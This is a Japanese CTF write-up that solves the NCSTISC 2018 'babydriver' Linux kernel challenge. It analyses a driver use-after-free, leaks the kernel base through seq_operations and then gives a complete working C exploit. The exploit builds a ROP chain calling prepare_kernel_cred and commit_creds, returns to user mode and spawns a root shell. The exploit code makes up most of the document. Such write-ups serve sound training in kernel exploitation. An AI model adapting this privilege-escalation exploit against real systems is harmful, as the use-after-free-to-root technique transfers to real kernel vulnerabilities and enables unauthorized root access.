keywords
super-easy, baby, heap, UAF, slub, kernel exploit

# イントロ
kernel強化月間なのでいい感じの問題集を探していたところ[hamaさんのブログ](https://hama.hatenadiary.jp/entry/2018/12/03/000000)によさげなのがあったため解いていく。第1問目は**NCSTISC CTF 2018**の**babydriver**。
ブログよく見てみたら[hamaリストには2019年版](https://hama.hatenadiary.jp/entry/2019/12/01/231213)もありました。解いていきたいですね

# static analysis
## basics
```static.sh
$ modinfo ./babydriver.ko
filename:       /home/wataru/Documents/ctf/ncstisc2018/babydriver/work/./babydriver.ko
description:    Driver module for begineer
license:        GPL
srcversion:     BF97BBB242B36676F9A574E
depends:
vermagic:       4.4.72 SMP mod_unload modversions

/ $ cat /proc/version
Linux version 4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP T7

  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
  -smp cores=1,threads=1 \
  -cpu kvm64,+smep \
```
SMEP有効・SMAP無効・oops->panic・KASLR有効

## cdev
```cdev.sh
(gdb) p *(struct cdev*)0xffffffffc0002460
$1 = {
  kobj = {
    name = 0x0,
    entry = {
      next = 0xffffffffc0002468,
      prev = 0xffffffffc0002468
    },
    parent = 0x0,
    kset = 0x0,
    ktype = 0xffffffff81e779c0,
    sd = 0x0,
    kref = {
      refcount = {
        refs = {
          counter = 1
        }
      }
    },
    state_initialized = 1,
    state_in_sysfs = 0,
    state_add_uevent_sent = 0,
    state_remove_uevent_sent = 0,
    uevent_suppress = 0
  },
  owner = 0xffffffffc0002100,
  ops = 0xffffffffc0002000,
  list = {
    next = 0xffffffffc00024b0,
    prev = 0xffffffffc00024b0
  },
  dev = 260046848,
  count = 1
}
(gdb) p *((struct cdev*)0xffffffffc0002460).ops
$3 = {
  owner = 0xffffffffc0002100,
  llseek = 0x0,
  read = 0xffffffffc0000130,
  write = 0xffffffffc00000f0,
  read_iter = 0x0,
  write_iter = 0x0,
  iopoll = 0x0,
  iterate = 0x0,
  iterate_shared = 0xffffffffc0000080,
  poll = 0x0,
  unlocked_ioctl = 0x0,
  compat_ioctl = 0xffffffffc0000030,
  mmap = 0x0,
  mmap_supported_flags = 18446744072635809792,
  (snipped...)
↑ 結構オフセット違うからダメだわ
}
```
実装されている*fops*は、*open/read/write/ioctl*の4つ。

## fops
```fops.c
open:
    babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc-64)
    babydev_struct.buf_len = 0x40
write:
    if babydev_struct.device_buf is not NULL and arg_size < babydev_struct.buf_len then
        _copy_from_user(baby_dev_struct.device_buf, arg_size)
read:
        if babydev_struct.device_buf is not NULL and arg_size < babydev_struct.buf_len then
        _copy_to_user(baby_dev_struct.device_buf, arg_size)
ioctl:
    if cmd == 0x10001 then
        kfree(babydev_struct.device_buf)
        babydev_struct.device_buf = kmem_cache_alloc_trace(size)
        babydev_struct.buf_len = 0x40
```
*ioctl*で任意の大きさに*buf*を取り直せる。

# vuln
`babyrelease()`時に`babydev_struct.device_buf`を`kfree()`するのだが、参照カウンタ等による制御を行っていない。そのため複数`open()`しておいてどれか一つで`close()`すると簡単に**UAF**が実現できる。しかも、freeされているオブジェクトを再allocするまでもなく保有できる。
え、もうこの時点で解けたことにしていいかな。。。いや、何か新しい気付きがあるかも知れないから一応やってみよ。

# kernbase leak
*/proc/self/stat*を`read()`して`seq_operations`から`leak`。それだけ。

# get RIP
さっき使った`seq_operations`を使いまわしてそのままRIPを取れる。SMEP有効だからROP chainして終わり。まじで、ROP chainのgadget調べる時間のほうがこの問題解くよりも1.5倍くらい多い気がする。

# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH "/dev/babydev"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

/******* babydev ****************/
#define INF 1<<31
size_t current_size = INF;

int _open(){
  int _fd = open(DEV_PATH, O_RDWR);
  assert(_fd > 0);
  current_size = 0x40;
  return _fd;
}

void _write(int fd, char *buf, size_t size){
  assert(size < current_size);
  assert(write(fd, buf, size) >= 0);
}

void _realloc(int fd, size_t size){
  assert(ioctl(fd, 0x10001, size) == 0);
  current_size = size;
}

void _close(int fd){
  assert(close(fd) >= 0);
}

void _read(int fd, char *buf, size_t size){
  assert(size < current_size);
  assert(read(fd, buf, size) > 0);
}
/******* (END babydev) *************/

/*** gadgets ***/
/*
0xffffffff810eefd0: mov esp, 0x5DFFFA88 ; ret  ;  (1 found)
0xffffffff81018062: mov rdi, rax ; rep movsq  ; pop rbp ; ret  ;  (1 found)
0xffffffff810a1810 T prepare_kernel_cred
0xffffffff810a1420 T commit_creds
0xffffffff8102a4a5: mov rax, rdi ; pop rbp ; ret  ;  (32 found)
0xffffffff8181a797:       48 cf                   iretq
0xffffffff8100700c: pop rcx ; ret  ;  (25 found)

0xffffffff81063694:       0f 01 f8                swapgs
0xffffffff81063697:       5d                      pop    rbp
0xffffffff81063698:       c3                      ret

*/

void gen_chain(ulong *a, const ulong kernbase)
{
  scu pop_rdi =             0x3e7d9d;
  scu prepare_kernel_cred = 0x0a1810;
  scu rax2rdi_rep_pop_rbp = 0x018062;
  scu pop_rcx =             0x00700c;
  scu commit_creds =        0x0a1420;
  scu swapgs_pop_rbp =      0x063694;
  scu iretq =               0x81a797;

  save_state();

  *a++ = pop_rdi + kernbase;
  *a++ = 0;
  *a++ = prepare_kernel_cred + kernbase;
  *a++ = pop_rcx + kernbase;
  *a++ = 0;
  *a++ = rax2rdi_rep_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = commit_creds + kernbase;

  *a++ = swapgs_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = iretq + kernbase;
  *a++ = &NIRUGIRI;
  *a++ = user_cs;
  *a++ = user_rflags;
  *a++ = user_sp;
  *a++ = user_ss;

  *a++ = 0xdeadbeef; // unreachable
}

/************ MAIN ****************/

int main(int argc, char *argv[]) {
  char buf[0x2000];
  int fd[0x10];
  int statfd;

  // UAF
  fd[0] = _open();
  fd[1] = _open();
  _realloc(fd[0], 0x20);
  _close(fd[0]);

  // leak kernbase
  statfd = open("/proc/self/stat", O_RDONLY);
  assert(statfd > 0);
  _read(fd[1], buf, 0x10);
  const ulong single_start = ((ulong*)buf)[0];
  const ulong kernbase = single_start - 0x22f4d0UL;
  printf("[!] single_start: %lx\n", single_start);
  printf("[!] kernbase: %lx\n", kernbase);

  // prepare chain and get RIP
  const ulong gadstack = 0x5DFFFA88;
  const char *maddr = mmap(gadstack & ~0xFFF, 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  const ulong **chain = maddr + (gadstack & 0xFFF);
  gen_chain(chain, kernbase);

  ((ulong*)buf)[0] = kernbase + 0x0eefd0;
  _write(fd[1], buf, 0x8);

  // NIRUGIRI
  read(statfd, buf, 1);

  return 0;
}
```

# アウトロ
新しい気づきは、ありませんでした。

もうすぐ3.11から10年ですね。あの時から精神的にも知能的にも技術的にも何一つ成長できている気がしませんが、小学生の自分には笑われないようにしたいですね。

あと柴犬飼いたいですね。


# symbols without KASLR
```symbols.txt
cdev: 0xffffffffc0002460
fops: 0xffffffffc0002000
kmem_cache_alloc_trace: 0xffffffff811ea180
babyopen: 0xffffffffc0000030
babyioctl: 0xffffffffc0000080
babywrite: 0xffffffffc00000f0
kmalloc-64: 0xffff880002801b00
kmalloc-64's cpu_slub: 0x19e80
babydev_struct: 0xffffffffc00024d0
```

# 参考
hamaリスト2018
https://hama.hatenadiary.jp/entry/2018/12/01/000000
hamaリスト2019
https://hama.hatenadiary.jp/entry/2019/12/01/231213
ニルギリ
https://youtu.be/yvUvamhYPHw
